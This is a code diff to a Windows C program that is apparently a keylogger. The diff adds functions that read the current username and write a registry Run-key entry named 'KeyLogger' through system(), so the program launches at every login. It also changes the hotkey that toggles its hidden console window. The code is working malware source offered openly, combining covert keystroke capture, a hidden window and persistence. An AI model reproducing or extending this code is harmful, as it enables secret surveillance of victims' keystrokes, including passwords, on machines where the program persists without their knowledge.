@@ -1,8 +1,13 @@
 #define _CRT_SECURE_NO_WARNINGS
 
-#include<stdio.h>
+#include <stdio.h>
 #include <Windows.h>
-#include <conio.h>
+#include <lmcons.h>
+
+void GetUser();
+void SetStartupProgram();
+
+char user[256];
 
 int main()
 {
@@ -20,6 +25,9 @@ int main()
 
 	memset(numbers, false, sizeof(numbers));
 	memset(alphabets, false, sizeof(alphabets));
+
+	GetUser();
+	SetStartupProgram();
 
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
@@ -583,7 +591,7 @@ int main()
 			alphabets[25] = false;
 		#pragma endregion
 
-		if (GetAsyncKeyState(0x71) && GetAsyncKeyState(0x73) && GetAsyncKeyState(0x77))
+		if (GetAsyncKeyState(0x21) && GetAsyncKeyState(0x22) && GetAsyncKeyState(0x23) && GetAsyncKeyState(0x24))
 			show = !show;
 
 		if (show == false)
@@ -595,4 +603,34 @@ int main()
 			ShowWindow(GetConsoleWindow(), SW_SHOW);
 		}
 	}
+}
+
+void GetUser()
+{
+	WCHAR temp[UNLEN + 1];
+	DWORD temp_length = UNLEN + 1;
+
+	memset(user, 0, sizeof(user));
+	memset(temp, 0, sizeof(temp));
+
+	GetUserNameW(temp, &temp_length);
+
+	wcstombs(user, temp, sizeof(user));
+
+	return;
+}
+
+void SetStartupProgram()
+{
+	char temp[1024];
+
+	memset(temp, 0, sizeof(temp));
+
+	strcpy(temp, "REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v KeyLogger /t REG_SZ /d C:\\Users\\");
+	strcat(temp, user);
+	strcat(temp, "\\AppData\\Local\\KeyLogger.exe /f"); 
+
+	system(temp);
+
+	return;
 }
